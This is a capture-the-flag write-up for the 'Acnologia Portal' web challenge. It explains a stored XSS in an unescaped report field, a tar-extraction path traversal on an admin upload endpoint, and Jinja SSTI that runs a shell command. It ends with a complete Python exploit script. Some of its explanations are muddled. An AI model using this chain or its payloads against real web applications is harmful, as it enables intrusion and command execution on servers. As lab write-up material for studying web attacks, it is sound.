## Acnologia Portal

## Challenge Author(s):

Ulysses

## Description:

Bonnie has confirmed the location of the Acnologia spacecraft operated by the Golden Fang mercenary. Before taking over the spaceship, we need to disable its security measures. Ulysses discovered an accessible firmware management portal for the spacecraft. Can you help him get in?



# Target: docker ip on demand

## Difficulty/Points: 350/easy

## Flag: HTB{des3r1aliz3_4all_th3_th1ngs}


## Challenge

the challenge has a login page and a registration page. you can register as a new user and enter the portal. The page is presented with a table containing various information and a button for reporting problems. By pressing the button, a form appears to be filled in.

# Solution 

First, having the source code available I made sure that the login and registration form had special vulnerabilities but this was not the case, they are secure pages. Continuing with my investigation I try to understand what the report form does by testing its security in sending the information to the server. We note from the source code that there are endpoints tied to the admin that could be used to make requests on its behalf. This makes me think that somehow it is possible to contact the server as an admin and therefore perhaps some sort of XSS can be implemented. I immediately thought about how this could be done by reading the source code and realised that by sending an XSS paylaod via the form I could contact pipedream (webhook for listening to HTTP requests). Unfortunately, it is not enough to perform an XSS, but I have to do a lot more to capture the flag which is hidden in the server in a folder of the root user. the XSS is important because I have to be able to perform operations on behalf of the admin and not on my own which I do not have the necessary privileges to perform the right operations. In the html of the response generated by the form request there is this particular tag that catches my eye:
<p class="card-text">Issue : {{ report.issue | safe }} </p>.
this html tag is very interesting, it's saying that the value contained within the issue field in the report post will not be put to any filter so if I put in report.issue=xss I will have my first successful attack. The second part requires a lot more attention to the source code. The second part of the attack lies in the endpoint used to make file uploads. This endpoint is not used by html pages, but we can use it if we use the first part of the attack to authenticate as admin. Authentication as admin is done using a form of 'advanced XSS' if we want to call it that, i.e. an SSTI. Compared to XSS, many things change, because XSS is mainly based on the execution of client code interpreted by the browser so we cannot do many of the things we are interested in. XSS is used to post to one of our webhooks, for example, while SSTI is used to run python source code on the server. If the server is running python code it will certainly have admin credentials and we can then take advantage of the upload endpoint. Once the paylaod containing the SSTI is generated, we name it after one of the html files already present such as register.html. Inside register.html we will find the contents of our executed code, i.e. the flag. SSTI is possible thanks to a special handling performed by a function called from the upload endpoint. The function uses a special library for managing tar files. The function allows the extraction of submitted files, but does not check to see where the final extracted file may be located. If an absolute path is added as a file name, it will be interpreted as an absolute storage path and I will be able to store my SSTI payload within the registration page. The XSS contains a function to dynamically send a file since I will have no way to control the server's browser and do the operations by hand. This part of the XSS is needed to be authenticated as admin and store the SSTI instead of the registration page.

```python
 import requests,base64,time,sys

url="178.62.83.221:31225"

filename="/app/application/templates/register.html"
base64_payload=base64.b64encode("{{url_for.__globals__['os'].popen('cat /flag.txt').read()}}".encode("utf-8")).decode("utf-8")

payload="""

<script>
const b64toBlob = (b64Data, contentType='', sliceSize=512) => {
  const byteCharacters = atob(b64Data);
  const byteArrays = [];

  for (let offset = 0; offset < byteCharacters.length; offset += sliceSize) {
    const slice = byteCharacters.slice(offset, offset + sliceSize);

    const byteNumbers = new Array(slice.length);
    for (let i = 0; i < slice.length; i++) {
      byteNumbers[i] = slice.charCodeAt(i);
    }

    const byteArray = new Uint8Array(byteNumbers);
    byteArrays.push(byteArray);
  }

  const blob = new Blob(byteArrays, {type: contentType});
  return blob;
}

const blob = b64toBlob("*BASE64_PAYLOAD*", "");


myFormData = new FormData();
myFormData.append("file", blob, "*FILENAME*");
fetch("http://*URL*/api/firmware/upload", {
    method: "post",
    body: myFormData,
    credentials: "include",
    mode: "no-cors"
});
</script>

""".replace("*URL*","localhost:1337").replace("*BASE64_PAYLOAD*",base64_payload).replace("*FILENAME*",filename)
payload_xss=payload
session = requests.session()

burp0_url = "http://{}/api/register".format(url)
burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36", "Content-Type": "application/json", "Accept": "*/*", "Origin": "http://192.168.1.14:1337", "Referer": "http://192.168.1.14:1337/register", "Accept-Encoding": "gzip, deflate", "Accept-Language": "it-IT,it;q=0.9,en-US;q=0.8,en;q=0.7", "Connection": "close"}
burp0_json={"password": "asd", "username": "asd"}
session.post(burp0_url, headers=burp0_headers, json=burp0_json)

burp0_url = "http://{}/api/login".format(url)
burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36", "Content-Type": "application/json", "Accept": "*/*", "Origin": "http://192.168.1.14:1337", "Referer": "http://192.168.1.14:1337/", "Accept-Encoding": "gzip, deflate", "Accept-Language": "it-IT,it;q=0.9,en-US;q=0.8,en;q=0.7", "Connection": "close"}
burp0_json={"password": "asd", "username": "asd"}
session.post(burp0_url, headers=burp0_headers, json=burp0_json)


burp0_url = "http://{}/api/firmware/report".format(url)
burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36", "Content-Type": "application/json", "Accept": "*/*", "Origin": "http://192.168.1.14:1337", "Referer": "http://192.168.1.14:1337/dashboard", "Accept-Encoding": "gzip, deflate", "Accept-Language": "it-IT,it;q=0.9,en-US;q=0.8,en;q=0.7", "Connection": "close"}
burp0_json={"issue": payload_xss, "module_id": "1"}
r=session.post(burp0_url, headers=burp0_headers, json=burp0_json)
print(r.text)

time.sleep(5)

print(requests.get("http://{}/register".format(url)).text)
```

the flag will be received printed in the register page.